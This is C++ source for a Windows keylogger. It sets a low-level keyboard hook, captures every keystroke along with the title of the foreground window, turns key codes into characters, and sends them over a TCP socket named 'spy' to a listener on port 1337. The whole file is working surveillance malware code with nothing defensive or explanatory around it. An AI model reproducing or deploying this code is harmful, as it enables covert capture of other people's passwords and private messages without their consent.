#include "keyLogger.hpp"

int transform(const int& key)
{
    while (spy.connect(sf::IpAddress::LocalHost, 1337) != sf::Socket::Status::Done)
            std::this_thread::sleep_for(std::chrono::milliseconds(250));

    sf::Packet data;

    std::string unpackedData;

    if (key == VK_RBUTTON)
        return 0;

    auto foreGroundApplication = GetForegroundWindow();

    if (foreGroundApplication)
    {
        char nameChar[256];

        GetWindowTextA(foreGroundApplication, nameChar, 256);

        std::string name(nameChar);

        if (name != prevName)
        {
            data << "\n application: " << name << '\n';
            prevName = name;
        }
    }
    switch (key)
    {
    case(VK_RETURN):
        data << "\n"; break;
    case(VK_SPACE):
        data << " "; break;
    case(VK_TAB):
        data << "\t"; break;
    case(VK_LBUTTON):
        data << " "; break;
    default:
        bool lower = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

        auto crKey = MapVirtualKey(key, MAPVK_VK_TO_CHAR);

        if (crKey >= 48 && crKey <= 57)
        {
            if ((GetKeyState(VK_SHIFT) & 0x1000) != 0)
            {
                unpackedData.push_back(symbols.find(crKey)->second);
                break;
            }
        }

        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0)
            lower = !lower;
        if (!lower)
            crKey = tolower(crKey);
        if (key != VK_SHIFT && key != VK_CAPITAL)
            unpackedData.push_back(crKey);
        break;
    }

    data << unpackedData;
    
    spy.send(data);

    return 0;
}

LRESULT keyBoardCallBack(int code, WPARAM wParam, LPARAM lParam)
{
    if (code >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
            transform(kbStruct.vkCode);
        }
    }

    return CallNextHookEx(hook, code, wParam, lParam);
}
